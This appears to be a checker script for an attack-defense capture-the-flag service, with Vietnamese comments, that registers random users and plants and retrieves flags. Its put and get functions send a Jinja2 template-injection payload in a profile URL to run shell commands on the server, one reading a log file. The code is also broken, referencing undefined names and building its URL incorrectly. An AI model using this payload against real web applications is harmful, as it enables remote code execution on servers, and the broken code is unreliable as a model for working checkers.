#!/usr/bin/env python3
import random
import requests
from checklib import *
from checklib import status

from dct_lib import DCTLib 

class Checker(BaseChecker):
    vulns: int = 1
    timeout: int = 15
    uses_attack_data: bool = True

    req_ua_agents = ['python-requests/2.{}.0'.format(x) for x in range(15, 28)]

    def __init__(self):
        super(Checker, self).__init__(*args, **kwargs)
        self.lib = DCTLib(self)
        self.id_regexp = re.compile(r'^[0-9A-Za-z]{1,40}$')
        
        self.base = "username=&email=&password=&phone=&address=&job=&dob=&hobbies="
        # Tạo chuỗi dữ liệu với giá trị ngẫu nhiên
        self.random_data_dict, self.random_data_registry = self.generate_random_data()
        
    
    def session_with_req_ua(self):
        sess = get_initialized_session()
        if random.randint(0, 1) == 1:
            sess.headers['User-Agent'] = random.choice(self.req_ua_agents)
        return sess
    
    def action(self, action, *args, **kwargs):
        try:
            super(Checker, self).action(action, *args, **kwargs)
        except requests.exceptions.ConnectionError:
            self.cquit(Status.DOWN, 'Connection error', 'Got requests connection error')


    def generate_random_data(self):
        data = self.base
        # Tách data thành các cặp key-value
        data_parts = data.split('&')
        random_data = []
        _dict = {}

        for part in data_parts:
            key, value = part.split('=')

            # Random hóa giá trị cho mỗi key
            if key == 'username':
                random_value = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))  # username ngẫu nhiên
            elif key == 'email':
                random_value = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5)) + '@gmail.com'  # email ngẫu nhiên
            elif key == 'password':
                random_value = ''.join(random.choices(string.ascii_letters + string.digits, k=16))  # password ngẫu nhiên
            elif key == 'phone':
                random_value = ''.join(random.choices(string.digits, k=10))  # phone ngẫu nhiên
            elif key == 'address':
                random_value = ''.join(random.choices(string.ascii_letters + string.digits, k=10))  # address ngẫu nhiên không có ký tự đặc biệt
            elif key == 'job':
                random_value = ''.join(random.choices(string.ascii_lowercase, k=5))  # job ngẫu nhiên
            elif key == 'dob':
                random_value = f"1990-01-{random.randint(1, 31):02d}"  # dob ngẫu nhiên trong năm 1990
            elif key == 'hobbies':
                random_value = random.choice(['hacking', 'reading', 'gaming', 'coding'])  # hobbies ngẫu nhiên
            else:
                random_value = ''.join(random.choices(string.ascii_letters + string.digits, k=10))  # random cho những key khác

            # Thêm key và giá trị random vào danh sách mới
            random_data.append(f"{key}={random_value}")
            _dict[key] = random_value
            
        # Ghép các cặp key-value thành chuỗi
        return _dict, '&'.join(random_data)

    def check(self):
        session = self.session_with_req_ua()
        
        signup_ok = self.lib.signup(session, self.random_data_registry)
        signin_ok = self.lib.signin(session, self.random_data_dict)
        
        self.assert_eq(signup_ok, True)
        self.assert_eq(signin_ok, True)
        
        self.cquit(Status.OK)

    def put(self, flag_id: str, flag: str, vuln: str):
        sess = self.session_with_req_ua()
        url = f"{TARGET_URL}/profile/?user={{cycler.__init__.__globals__.os.popen('" + f"./update_flag.py {flag}" + "').read()}}"
        res = requests.get(
            url=url
        )
        if res.status_code != 200:
            self.cquit(Status.DOWN)

        self.cquit(Status.OK, route_id, f"{u}:{p}:{route_id}")
        
    
    def get(self, flag_id: str, flag: str, vuln: str):
        # chạy exploit lấy flag
        url = f"{TARGET_URL}/profile/?user={{cycler.__init__.__globals__.os.popen('cat /tmp/system/log/system_sys.log').read()}}"
        res = requests.get(
            url=url
        ).content.decode('utf-8').strip()
        
        try:
            if len(res) == 32 and "=" in res[31:]:
                self.cquit(Status.OK)
            else:
                self.cquit(Status.MUMBLE)
        except Exception as e:
            self.cquit(Status.DOWN)

        self.cquit(Status.DOWN)

    
if __name__ == '__main__':
    c = Checker(sys.argv[2])

    try:
        c.action(sys.argv[1], *sys.argv[3:])
    except c.get_check_finished_exception() as e:
        cquit(status.Status(c.status), c.public, c.private)
